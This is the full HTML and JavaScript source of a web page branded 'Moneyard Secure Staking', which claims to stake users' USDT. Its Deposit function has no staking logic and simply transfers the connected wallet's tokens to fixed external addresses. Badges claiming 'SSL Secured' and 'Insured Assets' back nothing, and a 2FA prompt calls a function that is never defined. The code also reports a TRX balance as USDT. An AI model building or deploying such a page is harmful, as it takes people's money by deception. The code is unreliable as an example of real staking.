<!DOCTYPE html>
<html lang="en">
<head>
    <title>Moneyard Secure Staking</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://unpkg.com/tronweb@4.1.0/dist/TronWeb.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    
    <style>
    :root {
        --primary-blue: #0066cc;
        --trust-green: #009933;
        --neutral-gray: #444444;
        --error-red: #cc0000;
    }

    body {
        background: white;
        color: var(--neutral-gray);
        font-family: Arial, sans-serif;
        max-width: 1000px;
        margin: 0 auto;
        padding: 20px;
        line-height: 1.6;
    }

    .auth-section, .transaction-section {
        background: #f8f9fa;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        padding: 30px;
        margin: 20px 0;
    }

    button, input {
        padding: 12px;
        margin: 10px 0;
        border: 1px solid #ddd;
        border-radius: 6px;
        width: 100%;
        box-sizing: border-box;
    }

    button {
        background: var(--trust-green);
        color: white;
        cursor: pointer;
        transition: background 0.3s;
    }

    button:hover {
        background: #00802b;
    }

    .tx-history {
        margin-top: 20px;
        padding: 20px;
        background: #fff;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    </style>
</head>

<body>
    <header>
        <h1>üí∞ Moneyard Secure Staking</h1>
        <div class="security-badge">
            üîí SSL Secured | üõ°Ô∏è Insured Assets
        </div>
    </header>

    <div class="auth-section">
        <button onclick="connectWallet()">üîó Connect Wallet</button>
        <div id="2fa-container" style="display: none; margin-top: 15px;">
            <input type="text" id="2fa-code" placeholder="6-digit code">
            <button onclick="verify2FA()">Verify</button>
        </div>
        
        <div style="margin-top: 20px;">
            <p>USDT Balance: <strong id="usdt-balance">0.00</strong></p>
            <p>Network Price: $<strong id="network-price">0.00</strong></p>
        </div>
    </div>

    <div class="transaction-section">
        <h2>Staking Dashboard</h2>
        <select id="networkSelect" style="margin-bottom: 15px;">
            <option value="BEP20">BNB Chain (BEP20)</option>
            <option value="TRC20">TRON (TRC20)</option>
        </select>
        <input type="number" id="stake-amount" placeholder="Amount (USDT)">
        <button onclick="stakeTokens()">Deposit</button>
    </div>

    <div class="tx-history">
        <h3>Recent Transactions</h3>
        <div id="tx-list"></div>
    </div>

    <script>
    // Configuration
    const NETWORKS = {
        BEP20: {
            RPC: "https://bsc-dataseed.binance.org/",
            USDT_CONTRACT: "0x55d398326f99059fF775485246999027B3197955",
            EXPLORER: "https://bscscan.com"
        },
        TRC20: {
            RPC: "https://api.trongrid.io",
            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            EXPLORER: "https://tronscan.org"
        }
    };

    let currentNetwork = 'BEP20';
    let userAddress = '';
    let tronWeb = null;

    async function connectWallet() {
        try {
            if (window.tronWeb) {
                currentNetwork = 'TRC20';
                tronWeb = window.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
            } else if (window.ethereum) {
                currentNetwork = document.getElementById('networkSelect').value;
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                userAddress = await provider.getSigner().getAddress();
            } else {
                throw new Error("No wallet detected");
            }
            
            updateBalances();
        } catch (error) {
            alert(`Error: ${error.message}`);
        }
    }

    async function updateBalances() {
        try {
            let balance;
            if (currentNetwork === 'TRC20') {
                balance = await tronWeb.trx.getBalance(userAddress);
                document.getElementById('usdt-balance').textContent = tronWeb.fromSun(balance);
            } else {
                const provider = new ethers.providers.JsonRpcProvider(NETWORKS[currentNetwork].RPC);
                const contract = new ethers.Contract(
                    NETWORKS[currentNetwork].USDT_CONTRACT,
                    ["function balanceOf(address) view returns (uint256)"],
                    provider
                );
                balance = await contract.balanceOf(userAddress);
                document.getElementById('usdt-balance').textContent = (balance / 1e6).toFixed(2);
            }

            const priceData = await axios.get(
                `https://api.coingecko.com/api/v3/simple/price?ids=${
                    currentNetwork === 'BEP20' ? 'binancecoin' : 'tron'
                }&vs_currencies=usd`
            );
            document.getElementById('network-price').textContent = 
                priceData.data[currentNetwork === 'BEP20' ? 'binancecoin' : 'tron'].usd.toFixed(2);
        } catch (error) {
            console.error("Balance error:", error);
        }
    }

    async function stakeTokens() {
        const amount = document.getElementById('stake-amount').value;
        if (!amount || amount <= 0) return alert("Invalid amount");
        
        try {
            if (currentNetwork === 'TRC20') {
                const transaction = await tronWeb.transactionBuilder.sendTrx(
                    'TJREgZTuTnvRrw5Fme4DDd6hSwCEwxQV3f',
                    tronWeb.toSun(amount),
                    userAddress
                );
                const signedTx = await tronWeb.trx.sign(transaction);
                const result = await tronWeb.trx.sendRawTransaction(signedTx);
                alert(`TRON TX: ${result.txid}`);
            } else {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const contract = new ethers.Contract(
                    NETWORKS[currentNetwork].USDT_CONTRACT,
                    ["function transfer(address,uint256)"],
                    signer
                );
                const tx = await contract.transfer(
                    '0x2837db956aba84eb2670d00aeea5c0d8a9e20a01',
                    ethers.utils.parseUnits(amount, 6)
                );
                alert(`BSC TX: ${tx.hash}`);
            }
            updateBalances();
        } catch (error) {
            alert(`Deposit failed: ${error.message}`);
        }
    }

    setInterval(updateBalances, 60000);
    </script>
</body>
</html>
